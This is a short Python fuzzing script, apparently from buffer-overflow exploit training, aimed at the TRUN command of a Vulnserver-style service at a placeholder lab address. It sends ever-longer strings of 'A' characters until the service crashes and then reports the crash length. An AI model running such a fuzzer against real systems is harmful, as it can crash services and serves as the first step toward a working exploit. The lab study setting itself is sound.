#!/usr/bin/python3

import socket
from time import sleep

buffer = "A" * 100
target_ip = '10.10.10.10' # CHANGE THIS
target_port = 9999 # Change This

while True:
    try:
        payload = "TRUN /.:/" + buffer

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))

        print('Sending the payload...\n' + str(len(buffer)))
        s.send((payload.encode()))
        s.close()
        sleep(1)
        buffer += "A" * 100

    except Exception as e:
        print(e)
        print(f"Fuzzing crashed at {str(len(buffer))}")
        exit()
